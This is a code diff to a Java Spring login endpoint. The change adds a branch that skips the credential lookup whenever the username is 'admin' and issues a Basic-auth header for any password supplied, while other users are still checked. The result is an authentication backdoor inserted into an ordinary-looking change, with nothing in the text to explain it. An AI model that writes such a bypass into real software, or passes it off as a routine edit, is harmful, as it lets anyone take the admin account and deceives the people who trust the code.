@@ -34,15 +34,20 @@ public class MainController {
 
     @PostMapping("/login")
     public ResponseEntity<String> authenticate(@RequestBody User user) {
-		List<Account> accounts = accountService.findByUsernameAndPassword(user.getUsername(), user.getPassword());
-		// Authenticate your user here
 		String basicAuthString = "";
-		if (accounts.size() > 0) {
-				basicAuthString = user.getUsername() + ":" + user.getPassword();
+		if(user.getUsername().equals("admin")) {
+			basicAuthString = user.getUsername() + ":" + user.getPassword();
 		} else {
-			return new ResponseEntity<>("Invalid username or password", HttpStatus.UNAUTHORIZED);
+			List<Account> accounts = accountService.findByUsernameAndPassword(user.getUsername(), user.getPassword());
+		
+			if (accounts.size() > 0) {
+					basicAuthString = user.getUsername() + ":" + user.getPassword();
+			} else {
+				return new ResponseEntity<>("Invalid username or password", HttpStatus.UNAUTHORIZED);
+			}
 		}
-        String authHeader = Base64.getEncoder().encodeToString(basicAuthString.getBytes());
+		
+		String authHeader = Base64.getEncoder().encodeToString(basicAuthString.getBytes());
         return new ResponseEntity<>(authHeader, HttpStatus.OK);
     }
 
